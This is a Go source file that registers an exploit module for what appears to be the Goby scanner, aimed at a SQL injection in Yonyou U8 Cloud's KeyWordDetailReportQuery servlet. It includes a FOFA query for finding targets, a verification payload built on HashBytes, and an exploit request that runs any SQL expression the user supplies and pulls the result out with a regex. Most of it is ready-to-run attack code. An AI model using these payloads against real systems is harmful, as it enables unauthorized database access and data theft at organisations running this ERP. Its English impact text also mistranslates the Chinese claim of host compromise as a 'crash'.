package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Yongyou U8 Cloud /servlet/~iufo/nc.itf.iufo.mobilereport.data.KeyWordDetailReportQuery SQL Injection Vulnerability",
    "Description": "<p>Yonyou U8 cloud is a new generation cloud ERP launched by Yonyou, mainly focusing on growth oriented, innovative, and group oriented enterprises, providing overall solutions for enterprise level cloud ERP.</p><p>The Yonyou U8 Cloud KeyWordDetailReportQuery interface has an SQL injection vulnerability. Due to Yonyou GRP-U8 not effectively filtering user input, it directly concatenates it into SQL query statements, resulting in an SQL injection vulnerability in the system. Further exploitation can cause the host to crash.</p>",
    "Product": "yongyou U8",
    "Homepage": "https://www.yonyou.com/subject/zd-U8C",
    "DisclosureDate": "2024-05-10",
    "PostTime": "2024-05-14",
    "Author": "1971714067@qq.com",
    "FofaQuery": "body=\"请下载新版UClient\"",
    "GobyQuery": "body=\"请下载新版UClient\"",
    "Level": "3",
    "Impact": "<p>The Yonyou U8 Cloud KeyWordDetailReportQuery interface has an SQL injection vulnerability. Due to Yonyou GRP-U8 not effectively filtering user input, it directly concatenates it into SQL query statements, resulting in an SQL injection vulnerability in the system. Further exploitation can cause the host to crash.</p>",
    "Recommendation": "<p>Please follow the manufacturer's homepage for updates:<a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "Inject_param",
            "type": "input",
            "value": "@@VERSION",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/servlet/~iufo/nc.itf.iufo.mobilereport.data.KeyWordDetailReportQuery",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
                    "Content-Type": "application/json"
                },
                "data_type": "text",
                "data": "{\n        \"reportType\": \"' AND 2780 IN (select sys.fn_sqlvarbasetostr(HashBytes('MD5','123'))) AND 'njGF'='njGF\",\n        \"usercode\": \"18701014496\",\n        \"keyword\": [\n            {\"keywordPk\": \"1\", \"keywordValue\": \"1\", \"keywordIndex\": 1}\n        ]\n    }"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "0x202cb962ac59075b964b07152d234b70",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "keymemo|lastbody|variable|/servlet/~iufo/nc.itf.iufo.mobilereport.data.KeyWordDetailReportQuery",
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/servlet/~iufo/nc.itf.iufo.mobilereport.data.KeyWordDetailReportQuery"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/servlet/~iufo/nc.itf.iufo.mobilereport.data.KeyWordDetailReportQuery",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
                    "Content-Type": "application/json"
                },
                "data_type": "text",
                "data": "{\n        \"reportType\": \"' AND 2780 IN (select sys.fn_sqlvarbasetostr({{{Inject_param}}})) AND 'njGF'='njGF\",\n        \"usercode\": \"18701014496\",\n        \"keyword\": [\n            {\"keywordPk\": \"1\", \"keywordValue\": \"1\", \"keywordIndex\": 1}\n        ]\n    }"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|\\\\u0027N\\\\u0027(.*)\\\\u0027\\\\u0027"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "用友U8 Cloud /servlet/~iufo/nc.itf.iufo.mobilereport.data.KeyWordDetailReportQuery SQL 注入漏洞",
            "Product": "用友U8cloud",
            "Description": "<p>用友U8cloud是用友推出的新一代云ERP，主要聚焦成长型、创新型、集团型企业，提供企业级云ERP整体解决方案。</p><p>用友U8 Cloud KeyWordDetailReportQuery接口存在SQL注入漏洞，由于用友GRP-U8未对用户的输入进行有效的过滤，直接将其拼接进了SQL查询语句中，导致系统出现SQL注入漏洞，进一步利用可造成主机失陷。<br></p>",
            "Recommendation": "<p>请关注厂商主页更新：&nbsp;<a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a><br></p>",
            "Impact": "<p>用友U8 Cloud KeyWordDetailReportQuery接口存在SQL注入漏洞，由于用友GRP-U8未对用户的输入进行有效的过滤，直接将其拼接进了SQL查询语句中，导致系统出现SQL注入漏洞，进一步利用可造成主机失陷。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Yongyou U8 Cloud /servlet/~iufo/nc.itf.iufo.mobilereport.data.KeyWordDetailReportQuery SQL Injection Vulnerability",
            "Product": "yongyou U8",
            "Description": "<p>Yonyou U8 cloud is a new generation cloud ERP launched by Yonyou, mainly focusing on growth oriented, innovative, and group oriented enterprises, providing overall solutions for enterprise level cloud ERP.</p><p>The Yonyou U8 Cloud KeyWordDetailReportQuery interface has an SQL injection vulnerability. Due to Yonyou GRP-U8 not effectively filtering user input, it directly concatenates it into SQL query statements, resulting in an SQL injection vulnerability in the system. Further exploitation can cause the host to crash.</p>",
            "Recommendation": "<p>Please follow the manufacturer's homepage for updates:<a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a><br></p>",
            "Impact": "<p>The Yonyou U8 Cloud KeyWordDetailReportQuery interface has an SQL injection vulnerability. Due to Yonyou GRP-U8 not effectively filtering user input, it directly concatenates it into SQL query statements, resulting in an SQL injection vulnerability in the system. Further exploitation can cause the host to crash.<br><br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10950"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}